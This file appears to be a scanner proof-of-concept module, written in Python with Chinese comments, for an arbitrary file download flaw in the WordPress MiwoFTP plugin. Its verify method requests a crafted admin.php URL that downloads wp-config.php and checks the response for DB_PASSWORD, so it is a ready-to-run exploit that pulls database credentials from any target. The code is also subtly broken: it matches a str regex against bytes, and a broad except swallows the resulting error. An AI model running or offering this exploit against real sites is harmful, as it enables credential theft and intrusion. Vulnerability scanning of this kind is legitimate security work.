# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse


class Vuln(ABVuln):
    vuln_id = 'WordPress_MiwoFTP_0005'  # 平台漏洞编号，留空
    name = 'WordPress MiwoFTP 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        WordPress MiwoFTP Plugin <= 1.0.5 - Arbitrary File Download.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36801/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress MiwoFTP Plugin <= 1.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f32ea28d-54b4-4d04-8862-0a0156809dd2'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download'
                       '&item=wp-config.php&order=name&srt=yes')
            verify_url = self.target + payload
            request = urllib.request.Request(verify_url)

            response = urllib.request.urlopen(request)
            reg = re.compile("DB_PASSWORD")
            if reg.findall(response.read()):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
